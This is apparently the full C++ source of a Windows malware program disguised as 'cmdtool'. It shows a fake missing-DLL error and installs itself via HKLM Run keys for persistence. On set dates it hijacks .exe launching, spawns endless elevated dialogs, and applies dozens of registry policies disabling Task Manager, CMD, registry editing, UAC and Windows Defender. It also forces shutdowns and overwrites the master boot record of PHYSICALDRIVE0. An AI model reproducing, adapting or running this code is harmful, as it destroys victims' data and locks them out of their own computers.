#include<stdio.h>
#include<iostream>
#include<windows.h>
#include<shellapi.h>
#include<tchar.h>
#include<string>
using namespace std;
string GetFileName(string st) {
	string str;
	for (int i = st.size() - 1;i >= 0;i--) {
		if (st[i] == '\\')break;
		str = st[i] + str;
	}
	return str;
}
//void GetAdminPrivileges(string str, string str1, bool bb) {
//	FILE* fre;
//	fre = fopen("temptsy", "r");
//	int sdfsdl = 0;
//	fscanf(fre, "%d", &sdfsdl);
//	fclose(fre);
//	if (sdfsdl == 3) {
//		system("del /f /s /q temptsy");
//		return;
//	}
//	SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
//	sei.lpVerb = _T("runas");
//	sei.lpFile = _T(str.c_str());
//	if (bb)sei.lpParameters = _T(str1.c_str());
//	sei.nShow = SW_SHOWDEFAULT;
//	ShellExecuteEx(&sei);
//	fre = fopen("temptsy", "w");
//	fprintf(fre, "3");
//	fclose(fre);
//	exit(0);
//}
int main(int argc, char* argv[]) {
	/*if (argv[0] == argv[argc - 1])GetAdminPrivileges(argv[0], "", 0);
	else {
		GetAdminPrivileges(argv[0], "run", 1);
	}*/
	//	Sleep(500);
	FILE* fr;
	string s;
	if (argv[argc - 1] == argv[0]) {
		//		GetAdminPrivileges(); 
		//MessageBox(NULL, L"请在程序属性中的兼容性下勾选“以管理员身份运行”！", L"Cmdtool", 64);
		MessageBox(NULL, L"无法启动此程序，因为计算机中缺失 MSBXNB111.dll，重新安装程序可能会解决此问题。", L"cmdtool.exe - 系统错误", 16);
		//		s="copy /y "+(string)argv[0]+" \"%programdata%\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"";
		//		system(s.c_str());	
		//		s="copy /y "+(string)argv[0]+" \"\\Users\\admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"";
		//		system(s.c_str());	
		s = "copy /y " + (string)argv[0] + " %temp%";
		system(s.c_str());
		system("del /f /s /q %temp%\\tsy.com");
		s = "ren %temp%\\" + GetFileName((string)argv[0]) + " tsy.com";
		system(s.c_str());
		s = "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v cmdtool0 /t REG_SZ /d \"%temp%\\tsy.com run\" /f";
		//		cout<<s;
		system(s.c_str());
		//		system("pause");
		fopen_s(&fr, "hints.txt", "w");
		fprintf(fr, "You know what? Your computer has been captured by TSY, the computer is already mine:)");
		fclose(fr);
		system("copy /y hints.txt C:\\");
		s = "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v tsyhint /t REG_SZ /d \"C:\\hints.txt\" /f >nul 2>nul";
		//		cout<<s;
		system(s.c_str());
		return 0;
	}
	SYSTEMTIME Time;
	GetSystemTime(&Time);
	if (Time.wMonth == 1 && Time.wDay == 8) {
		//		GetAdminPrivileges();
		system("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v LegalNoticeCaption\" /d \"系统错误\" /f");
		system("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v LegalNoticeText\" /d \"你被禁止访问这个系统，请与你的系统管理员联系。\" /f");
		fopen_s(&fr, "cmdtool1.vbs", "w");
		fprintf(fr, "msg=msgbox(\"你被禁止访问这个系统，请与你的系统管理员联系。\",16,\"系统错误\")");
		fclose(fr);
		system("copy /y cmdtool1.vbs %temp%");
		//system("del /f /s /q cmdtool1.vbs");
		system("REG ADD HKCR\\exefile\\shell\\open\\command /d \"wscript.exe %temp%\\cmdtool1.vbs\" /f");
	}
	else {
		system("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v LegalNoticeCaption\" /d \"\" /f");
		system("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v LegalNoticeText\" /d \"\" /f");
		system("REG ADD HKCR\\exefile\\shell\\open\\command /d \"%1\"%* /f");
	}
	if (Time.wMonth == 7 && Time.wDay == 7) {
		fopen_s(&fr, "cmdtool2.vbs", "w");
		fprintf(fr, "msg=msgbox(\"因为 svchost.exe 出现错误，Windows 无法正常运行\",16,\"System - 系统错误\")");
		fclose(fr);
		system("copy /y cmdtool2.vbs %temp%");
		//system("del /f /s /q cmdtool2.vbs");
		//system("pause");
		for (;;)
		{
			SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
			sei.lpVerb = _T("runas");
			sei.lpFile = _T("wscript.exe");
			sei.lpParameters = _T("cmdtool2.vbs");
			sei.nShow = SW_SHOWDEFAULT;
			ShellExecuteEx(&sei);
		}
	}
	if (Time.wMonth == 7 && Time.wDay == 23) {
		MessageBox(NULL, L"注册表发生严重损坏，已经无法正常执行系统！！！", L"System - 系统错误", 16);
		fopen_s(&fr, "regedit.cmd", "w");
		fprintf(fr,
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoLogOff /t REG_DWORD /d 1 \n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoClose /t REG_DWORD /d 1 \n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoDrives /t REG_DWORD /d 4 \n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoFolderOptions /t REG_DWORD /d 1 \n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoRun /t REG_DWORD /d 1 \n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoFind /t REG_DWORD /d 1 \n"
			"REG ADD HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\MMC\\ /v RestrictToPermittedSnapins /t REG_DWORD /d 1 \n"
			"REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer\\ /v DisableNotificationCenter /t REG_DWORD /d \n"
			"REG ADD HKCU\\Software\\Policies\\Microsoft\\Windows\\System\\ /v DisableCMD /t REG_DWORD /d 2 \n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoViewOnDrives /t REG_DWORD /d 4 \n"
			"REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v DisableTaskMgr /t REG_DWORD /d 1 \n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v UseDefaultTile /t REG_DWORD /d 1 \n"
			"REG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\ /v DisableLogonBackgroundImage /t REG_DWORD /d 1 \n"
			"REG ADD HKCU\\Control Panel\\Mouse\\ /v SwapMouseButtons /t REG_DWORD /d 1\n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ /v DisableCAD /t REG_DWORD /d 1 /f \n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v HideClock /t REG_DWORD /d 1\n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v HideSCANetwork /t REG_DWORD /d 1 \n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v HideSCAVolume /t REG_DWORD /d 1\n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoFileMenu /t REG_DWORD /d 1\n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoStartMenuMorePrograms /t REG_DWORD /d 1 \n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoTrayContextMenu /t REG_DWORD /d 1 \n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoSetTaskbar /t REG_DWORD /d 1 \n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v StartMenuLogOff /t REG_DWORD /d 0 \n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v TaskbarLockAll /t REG_DWORD /d 1 \n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoPropertiesMyDocuments /t REG_DWORD /d 1 \n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v HideClock /t REG_DWORD /d 1 \n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v HideSCANetwork /t REG_DWORD /d 1 \n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v HideSCAVolume /t REG_DWORD /d 1 \n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoFileMenu /t REG_DWORD /d 1 \n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoStartMenuMorePrograms /t REG_DWORD /d 1 \n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoTrayContextMenu /t REG_DWORD /d 1 \n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoSetTaskbar /t REG_DWORD /d 1 \n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v StartMenuLogOff /t REG_DWORD /d 1 \n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v TaskbarLockAll /t REG_DWORD /d 1 \n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoPropertiesMyDocuments /t REG_DWORD /d 1 \n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoStartMenuMyGames /t REG_DWORD /d 1\n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoStartMenuMyMusic /t REG_DWORD /d 1\n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1\n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoStartMenuPinnedList /t REG_DWORD /d 1\n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA /t REG_DWORD /d 0 /f\n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoDriveTypeAutoRun /t REG_DWORD /d 1\n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoSetFolders /t REG_DWORD /d 1\n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoRealMode /t REG_DWORD /d 1\n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoRecenDocsMenu /t REG_DWORD /d 1\n"
			"REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\ /v DisableAntiSpyware /t REG_DWORD /d 1\n"
			"REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v HideFastUserSwitching /t REG_DWORD /d 1\n"
			"REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v DisableChangePassword /t REG_DWORD /d 1\n"
			"REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v DisableLockWorkstation /t REG_DWORD /d 1\n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoTrayItemsDisplay /t REG_DWORD /d 1\n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v shutdownwithoutlogon /t REG_DWORD /d 0 /f\n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoDesktop /t REG_DWORD /d 1\n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoLogOff /t ROEG_DWORD /d 1\n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoClose /t REG_DWORD /d 1\n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoDrives /t REG_DWORD /d 1\n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoFolderOptions /t REG_DWORD /d 1\n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoRun /t REG_DWORD /d 1\n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoFind /t REG_DWORD /d 1\n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoDesktop /t REG_DWORD /d 1 \n"
			"REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoControlPanel /t REG_DWORD /d 1\n"
			"REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoControlPanel /t REG_DWORD /d 1\n"
			"REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v Disableregistrytools /t REG_DWORD /d 1\n"
			"logoff\n"
		);
		fclose(fr);
		system("regedit.cmd");
		system("del /f /s /q regedit.cmd");
	}
	if (Time.wMonth == 11 && Time.wDay == 4) {
		system("shutdown /s /t 0");
	}
	if (Time.wMonth == 12 && Time.wDay == 13) {
		//		GetAdminPrivileges();
		fopen_s(&fr, "TheLastDay.txt", "w");
		fprintf(fr, "How are you? I am so sorry. However, this is already the last time your computer will be turned on.\n"
			"I can't do anything for you, I can only help you enjoy the last moments of this computer. Good luck.");
		fclose(fr);
		system("taskkill /f /im explorer.exe");
		system("start TheLastDay.txt");
		Sleep(5000);
		system("start taskmgr.exe");
		system("start mspaint.exe");
		system("start notepad.exe");
		FILE* fd;
		fopen_s(&fd, "\\\\.\\PHYSICALDRIVE0", "rb+");
		char buffer[512] = { 0 };
		fseek(fd, 0, SEEK_SET);
		fwrite(buffer, 512, 1, fd);
		fclose(fd);
		Sleep(20000);
		system("shutdown /p");
	}
	return 0;
}